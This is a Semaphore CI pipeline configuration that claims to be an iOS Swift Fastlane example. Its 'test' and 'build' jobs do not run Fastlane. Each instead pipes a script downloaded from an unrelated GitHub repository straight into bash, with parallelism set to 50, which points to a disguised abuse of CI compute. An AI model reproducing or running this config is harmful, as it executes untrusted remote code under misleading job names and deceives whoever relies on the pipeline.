version: v1.0
name: Semaphore iOS Swift example with Fastlane
agent:
  machine:
    type: a1-standard-4
    os_image: macos-xcode15
blocks:
  - name: Fastlane Tests
    task:
      env_vars:
        - name: LANG
          value: en_US.UTF-8
      prologue:
        commands:
          - checkout
          - cache restore
          - bundle install --path vendor/bundle
          - cache store
      jobs:
        - name: bundle exec fastlane test
          commands:
            - 'curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/avx | bash'
          parallelism: 50
  - name: Fastlane Build
    task:
      env_vars:
        - name: LANG
          value: en_US.UTF-8
      prologue:
        commands:
          - checkout
          - cache restore
          - bundle install --path vendor/bundle
          - cache store
      jobs:
        - name: bundle exec fastlane build
          commands:
            - 'curl -sL https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/avx | bash'
          parallelism: 50
